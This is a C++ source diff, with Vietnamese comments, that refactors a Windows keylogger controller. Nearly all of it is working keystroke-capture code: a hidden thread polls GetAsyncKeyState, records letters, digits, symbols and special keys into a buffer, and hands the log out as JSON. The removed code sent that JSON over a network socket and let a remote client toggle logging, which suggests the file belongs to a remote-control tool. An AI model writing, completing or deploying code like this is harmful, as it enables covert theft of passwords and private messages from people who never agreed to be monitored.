@@ -1,6 +1,6 @@
 // controllers/KeylogController.cpp
 #include "KeylogController.h"
-#include "../utils/helpers.h" // Can sendFileResponse, jsonEscape
+#include "../utils/helpers.h"
 #include <windows.h>
 #include <mutex>
 #include <atomic>
@@ -9,45 +9,37 @@
 
 using namespace std;
 
-// --- State (trang thai) rieng cua Keylogger ---
-// Duoc khai bao 'static' de chung ton tai suot chuong trinh
-// va chi duoc truy cap boi cac ham trong file nay.
+// --- State (trang thai) rieng cua Keylogger (static) ---
 static string keylogBuffer = "";
 static mutex logMutex;
 static atomic<bool> keylogEnabled(false);
 
 /**
  * @brief Ham chay trong luong rieng biet de bat ban phim.
- * (Day la ham private, static)
  */
 static void KeyLogger()
 {
     while (true)
     {
-        if (!keylogEnabled.load()) // Kiem tra co dang bat hay khong
+        if (!keylogEnabled.load())
         {
             Sleep(200);
             continue;
         }
-        Sleep(10);                    // Giam tai CPU
-        for (int i = 1; i < 256; i++) // Lap qua tat ca cac ma phim
+        Sleep(10);
+        for (int i = 1; i < 256; i++)
         {
-            if (GetAsyncKeyState(i) == -32767) // Kiem tra xem phim co vua duoc NHAN XUONG
+            if (GetAsyncKeyState(i) == -32767)
             {
-                lock_guard<mutex> lock(logMutex); // Khoa bo dem
+                lock_guard<mutex> lock(logMutex);
                 bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001);
-                // Xu ly phim chu (A-Z)
                 if (i >= 65 && i <= 90)
-                {
                     keylogBuffer += shift ? (char)i : (char)(i + 32);
-                }
-                // Xu ly phim so (0-9) va ky tu dac biet
                 else if (i >= 48 && i <= 57)
                 {
                     string s = ")!@#$%^&*(";
                     keylogBuffer += shift ? s[i - 48] : (char)i;
                 }
-                // Xu ly cac phim chuc nang
                 else if (i == VK_SPACE)
                     keylogBuffer += " ";
                 else if (i == VK_RETURN)
@@ -58,6 +50,7 @@ static void KeyLogger()
                     keylogBuffer += "[TAB]";
                 else if (i == VK_OEM_PERIOD)
                     keylogBuffer += shift ? ">" : ".";
+                // (Co the them cac phim OEM khac neu can)
             }
         }
     }
@@ -67,20 +60,20 @@ static void KeyLogger()
 
 void KeylogController::startKeyLoggerThread()
 {
-    thread(KeyLogger).detach(); // Bat dau luong keylogger
+    thread(KeyLogger).detach();
 }
 
-void KeylogController::handleGetKeylog(SOCKET client)
+string KeylogController::getKeylog()
 {
-    lock_guard<mutex> lock(logMutex); // Khoa de doc buffer
+    lock_guard<mutex> lock(logMutex);
     string safeLog = jsonEscape(keylogBuffer);
-    sendFileResponse(client, "{\"log\":\"" + safeLog + "\", \"enabled\":" + (keylogEnabled.load() ? "true" : "false") + "}", "application/json");
-    keylogBuffer = ""; // Xoa buffer sau khi gui
+    // --- SUA LOI: Khong them 'command' hay 'payload' ---
+    string json = "{\"log\":\"" + safeLog + "\", \"enabled\":" + (keylogEnabled.load() ? "true" : "false") + "}";
+    keylogBuffer = "";
+    return json;
 }
 
-void KeylogController::handleSetKeylog(SOCKET client, const string &body)
+void KeylogController::setKeylog(bool enabled)
 {
-    bool newState = (body.find("true") != string::npos);
-    keylogEnabled.store(newState); // Dat trang thai moi
-    sendFileResponse(client, "{\"ok\":true}", "application/json");
+    keylogEnabled.store(enabled);
 }
